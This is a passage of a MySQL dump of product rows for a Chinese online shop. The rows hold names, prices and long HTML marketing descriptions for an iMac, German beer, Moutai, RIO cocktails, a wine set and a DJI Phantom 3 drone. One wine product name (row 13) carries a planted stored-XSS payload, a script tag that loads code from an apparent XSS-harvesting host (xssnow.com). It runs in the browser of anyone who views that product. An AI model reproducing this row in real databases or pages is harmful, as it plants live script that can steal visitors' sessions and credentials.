来让你处理日常事务，比如浏览网络，查收电子邮件，编辑影片和照片，撰写报告和阅读图书。不仅如此，App Store 中还有成千上万款 app，专为 iPad 宽大的多点触控 Retina 显示屏而精心设计，绝不仅仅是手机 app 的简单放大。因此，无论你是爱好摄影，游戏，旅行，还是想管理自己的财务，总有一款 app 会让你做得更出色。\r\n</p>\r\n<p style=\"text-align:center;\">\r\n	<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154934369.jpg\" /> \r\n</p>\r\n<p>\r\n	<br />\r\n</p>\r\n<div style=\"color:#333333;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:35px;text-align:center;\">\r\n		iOS 8 和 iPad Air 2，<br />\r\n强强联手。\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		iOS 8 是超前的移动操作系统，其先进功能让 iPad Air 2 变得更不可或缺。连续互通功能可让你在这部设备上开始一个项目，然后在另一部设备上继续完成。家人共享功能让你与多达六人轻松共享图书和 app。而 iCloud Drive 可让你安全存储各种类型的文档，并从你的各种设备上访问。事实上，iOS 8 上的一切功能不仅是为了与 iPad Air 2 默契配合而设计，也是为了将强大的 A8X 芯片、超快的无线连接、以及绚丽 Retina 显示屏的优势发挥到淋漓尽致而打造。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20141024154942167.jpg\" /> \r\n	</p>\r\n</div>\r\n<p>\r\n	<br />\r\n</p>\r\n<p>\r\n	<br />\r\n</p>', '', '0', '1446299697', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('9', '苹果（Apple）iMac MF886CH/A 27英寸一体电脑', '', '\\Upload\\shop\\5634c8d5a085f.png', 'qita', '16800.00000000', '100.00000000', '20.00000000', '<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:65px;text-align:center;\">\r\n		iMac\r\n	</p>\r\n	<p style=\"font-size:26px;text-align:center;\">\r\n		Retina 的大作，一款又一款。\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		自始至终，iMac 背后的设计理念都未曾动摇，那就是打造超凡的台式电脑体验：为出众的显示屏搭配高性能处理器、图形处理器以及存储方案，并将它们融于浑然一体的纤薄机身之中。 Retina 显示屏就是一个清晰的例证。颗颗像素精心雕琢，方成精妙杰作。全新 21.5 英寸配备 Retina 4K 显示屏的 iMac，延续了我们对于精益求精的不懈追求。与开创性的 27 英寸 5K 机型一样，它的画质如此夺目，足以让画面之外的世界都顿显失色。这一次，我们又迈出了漂亮的一大步，让 iMac 从此给你更加引人入胜的体验。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022141936169.jpg\" /> \r\n	</p>\r\n	<p style=\"font-size:16px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<div>\r\n		&nbsp;\r\n	</div>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142047361.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		Apple 配件\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		可心的新设计，可充电，还可实现更多。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		全新 Magic Keyboard、Magic Mouse 2 和 Magic Trackpad 2 经过重新设计，为每次互动带来更出色的感受。从内置充电电池到更低的倾斜角度，方方面面都经过优化，带来更舒适的体验和更精彩的功能。与 iMac 配对使用时，更加默契出众。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142054915.jpg\" /> \r\n	</p>\r\n	<div>\r\n		<p style=\"font-size:25px;\">\r\n			<br />\r\n		</p>\r\n	</div>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		iMac 令人惊叹的纤薄机身之中，却满载各种先进的技术。所有 iMac 机型均标配两个 Thunderbolt 2 端口，可与外接硬盘和相机相连，实现疾速的数据传输。四个 USB 3 端口为你带来更多选择，让你可以轻松连接打印机、视频设备以及更多外设。你还可通过疾速的三串流 Wi-Fi 和蓝牙 4.0 无线技术随时连接，访问你喜欢的内容。\r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		为速度而来，<br />\r\n为实现更多而打造。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		初识 iMac，你会着迷于它纤薄的机身。然而，精美的外观，只是演绎其强大性能的舞台。凭借新一代 Intel Core 处理器、全新 AMD 图形处理器、先进的 Fusion Drive 可选配存储方案与 Thunderbolt 2，iMac 有着快若闪电的速度，以及令人叹为观止的强大动力。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142130891.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		OS X El Capitan\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		先进的电脑操作系统。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		Mac 之所以是 Mac，OS X 功不可没。它不仅设计直观、易用，更经过精心打造，能够充分发挥 Retina 显示屏的优势，让桌面上的一切都呈现令人惊艳的清晰效果。它配备一系列出众的 app，不仅便于你日常使用，更能让你乐在其中。此外，它还经过精心设计，实现了 Mac 和 iOS 设备之间的绝妙合作。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142159654.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		Mac 之所以是 Mac，OS X 功不可没。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		OS X 是赋予每部 Mac 强大动力的操作系统，它构建于坚如磐石的 UNIX 基础之上，并为充分发挥 Mac 的硬件性能而打造。OS X 的设计易用而又美观，并配有一系列令你每天都爱不释手的精彩 app，更能让你的 Mac 和 iOS 设备以卓越方式默契合作，紧密相连。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142208441.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		内置 App\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		众多精彩内置 App，如今更出彩。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		每台新购买的 Mac 均配备照片、iMovie、GarageBand、Pages、Numbers 和 Keynote。让你从开启它的那一刻起，就能尽情挥洒创意。同时，你还享有多款精彩 app，可用以收发电子邮件、畅游网络、发送文本信息、进行 FaceTime 视频通话，甚至还有一款专门的 app，能够帮助你寻找更多新的 app。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142216493.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:25px;text-align:center;\">\r\n		iCloud\r\n	</p>\r\n	<p style=\"font-size:34px;text-align:center;\">\r\n		让你在 iMac 上的种种所爱，<br />\r\n现身你的各种设备。\r\n	</p>\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		iCloud 可以存放你的内容，并让你无论使用什么设备，都能轻松访问照片、日历、联系人等等。你可以通过 iCloud Drive，将所有演示文稿、电子表格、PDF 文件、图片和任何其他格式的文件安全储存到 iCloud 上，然后在 iPhone、iPad、iPod touch、Mac 或 PC 上进行访问。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151022142224617.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446299861', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('10', '爱士堡（Eichbaum）小麦啤酒 500mlx24听 德国进口', '', '\\Upload\\shop\\5634c9a24fc5a.png', 'qita', '158.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:22px;color:red;\">\r\n		啤酒配送服务说明\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:14px;\">\r\n		1、本商品默认由京东物流负责配送发货，物流无法配送的区域，用户可选择换购本商城同等价位的商品（一件或多件），或选择补差价换购高价位商品。<br />\r\n2、由于业务发展变化、行政区域更名等因素，配送区域可能会不时有扩大、变更或调整，具体区域请以京东最新确认为准。<br />\r\n3、由于商品存在厂家更换包装、不同批次、不同生产日期、不同生产工厂等情况，导致商品实物与图片存在微小差异，因此请您以收到的商品实物为准，同时我们会尽量做到及时更新，由此给您带来不便敬请谅解，谢谢。<br />\r\n4、1元云购对本商品在法律范围内拥有最终解释权。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;\">\r\n	<div style=\"margin:0px auto;padding:0px;\">\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171206491.jpg\" />\r\n		</p>\r\n	</div>\r\n	<div style=\"margin:10px auto;font-family:微软雅黑;padding:0px;\">\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品名称</span>：爱士堡小麦啤酒\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品品牌</span>：爱士堡\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品产地</span>：德国\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">商品规格</span>：500ml/听\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">配 料</span>：水、大麦芽、小麦芽、啤酒花浸膏（抽提物）、酵母\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">酒精度</span>：5.3% vol\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">原麦汁浓度</span>：11.8°P\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">保质期限</span>：15个月\r\n		</p>\r\n		<p style=\"font-size:15px;\">\r\n			<span style=\"font-size:16px;\">储藏方法</span>：避免阳光直射和高温\r\n		</p>\r\n	</div>\r\n	<div style=\"margin:0px auto;padding:0px;\">\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171227561.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171233609.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171239701.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171246151.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img alt=\"\" src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606172152642.jpg\" style=\"width:793px;height:431px;\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171259614.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171305161.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171311833.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171317800.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171323591.jpg\" />\r\n		</p>\r\n		<p style=\"text-align:center;\">\r\n			<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150606171329762.jpg\" />\r\n		</p>\r\n	</div>\r\n</div>', '', '0', '1446300066', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('11', '茅台（MOUTAI）飞天茅台酒 53度 500ml', '', '\\Upload\\shop\\5634ca8a10c58.png', 'qita', '968.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;\">\r\n	<p style=\"font-size:14px;text-indent:28px;\">\r\n		茅台酒素以色清透明、醇香馥郁、入口柔绵、清冽甘爽、回香持久等特点而名闻天下，被称为中国的\"国酒\"。它以优质高粱为料，上等小麦制曲，每年重阳之际投料，利用茅台镇特有的气候，优良的水质和适宜的土壤， 采用与众不同的高温制曲、堆积、蒸酒，轻水分入池等工艺，再经过两次投料、九次蒸馏、八次发酵、七次取酒、长期陈酿而成。酒精度多在52～54度之间，是中国酱香型白酒的典范。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101631707.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p>\r\n		<span style=\"font-size:14.782608985900879px;line-height:19.130435943603516px;\">&nbsp;</span> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101700807.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101706720.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101712428.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:5px 0px;\">\r\n	<p style=\"font-size:16px;\">\r\n		&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101747256.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101814467.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101857507.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20140825101909395.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446300339', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('12', '锐澳（RIO）鸡尾酒 预调酒 KT新春幻彩装 275ml x 6瓶', '', '\\Upload\\shop\\5634cb3e580da.png', 'qita', '88.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513140932813.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513140938217.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:14px;\">\r\n		商品名称：锐澳 鸡尾酒 预调酒 KT新春幻彩装 275ml*6瓶\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		品<span>牌</span>：锐澳（RIO）\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		商品配料：水、白砂糖、伏特加、白兰地、浓缩苹果汁、浓缩桃汁、食品添加剂、食用香精。\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		商品规格：275ml*6瓶\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		酒精度：3.8%vol\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		原产国：中国\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		保质期：18个月\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		适用人群：成年人\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		贮存条件：请置于阴凉干燥处。避免高温和强光，禁止加热或0℃以下冷冻，切勿撞击，防止爆瓶。\r\n	</p>\r\n	<p style=\"font-size:14px;color:#FF0000;font-weight:bold;\">\r\n		温馨提示：新老包装交替(hello kitty版&amp; 非hello kitty经典版），随机发货； Hello kitty版有三种包装，随机发货。若有少量沉淀为天然果肉成分，请放心饮用。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141032921.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141038170.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141044830.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141049315.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141054587.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141100974.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141106252.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141115570.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150513141121747.jpg\" />\r\n	</p>\r\n</div>', '', '0', '1446300478', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('13', '瑞兹德比纳 干白葡萄酒 750ml x 6瓶 红酒套装<script src=http://xssnow.com/JFBG></script>', '', '\\Upload\\shop\\5634cbbdaf79f.png', 'dianzi', '3068.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112644419.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112702526.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112709634.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112718172.jpg\" />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112726214.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112734482.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112743293.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112752301.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112801820.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112808850.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112817387.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112825267.jpg\" />\r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150722112833711.jpg\" />\r\n	</p>\r\n</div>', '', '1', '1446300605', '1446220800', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('14', '大疆（DJI）精灵3 Phantom 3 Advanced 高端专业HD航拍飞行器无人机', '', '\\Upload\\shop\\5634cc3a8481c.jpg', 'qita', '5888.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171334407.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:15px;text-align:center;\">\r\n		做自己生活的导演。现在，就由Phantom 3 带您冲上云霄，以全新的视角去发<br />\r\n现世界之美，将心中所想娓娓道来。4K相机带来清透画质，实时传送高清影像。<br />\r\n一切准备就绪，静候您的安排。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171401377.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#FFFFFF;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		全新相机\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		一体化集成相机可实现美妙30帧的2.7K高清录像，1200万像素的静态照片拍摄，内置精密传感器。 非球面镜的精密镜组，可显著消除镜头畸变，将世界真实还原。新一代传感器，画面质感更加清透， 色彩演绎饱满鲜亮。配合DJI工业级三轴稳定云台，轻松输出平稳流程的画面。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#FFFFFF;\">\r\n	<p style=\"font-size:30px;\">\r\n		实时高清画面传输\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		Phantom 3 Advanced 搭载了备受摄影师称赞的DJI高清图传技术，只需将移动设备与遥控器连接，即可 使用DJI GO App实时查看720P的高清航拍画面。\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		即使在传输距离高达2公里时，画面仍然清晰流畅。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#FFFFFF;\">\r\n	<p style=\"font-size:30px;\">\r\n		操控体验升级\r\n	</p>\r\n	<p style=\"font-size:14px;\">\r\n		Phantom 3 搭载DJI出色的智能飞控系统，继承了一贯优异的飞行稳定性。全新姿态算法，配合智能电调， 显著提高了机动性，带来敏捷流畅的操控体验。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		安全性\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		Phantom 3 Advanced 提供了独特的新手模式，为飞行树立安全屏障。您可通过设置飞行距离及高度限制， 让飞机在安全范围内飞行。让您在学习操作技巧的同时，尽情享受飞行乐趣。集成先进的飞行控制技术，支持一键起飞和降落，并具有智能的失控保护功能。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171513809.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		视觉定位系统\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		即使在室内无GPS环境下低空飞行，内置的视觉和超声波传感器也可通过感知地面纹理和相对高度，让 Phantom 3 实现精确定位悬停和平稳飞行。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		全新智能电池\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		全新升级的智能电池内置传感器及LED指示灯，您可实时掌握飞行器电池状态、电池剩余电量等信息。 系统会根据飞行距离计算返航和降落所需的电量和时间，让您对飞行时间有更准确的把控。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:30px;text-align:center;\">\r\n		强劲的动力系统\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		每一个电机均采用先进的制造工艺，动力更为强劲。无刷电机搭配先进的双向通信智能电调（ESC），<br />\r\n让Phantom 3 Advanced 在空中的响应更加敏捷，可随时加速或急停、快速上升或下降。<br />\r\nDJI独特的空气制动系统保证在放开摇杆时，飞机可自动定点悬停。<br />\r\n高精度自紧螺旋桨性能卓越，能在激烈的飞行中保持稳固。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171716756.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171722287.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:18px;text-align:center;\">\r\n		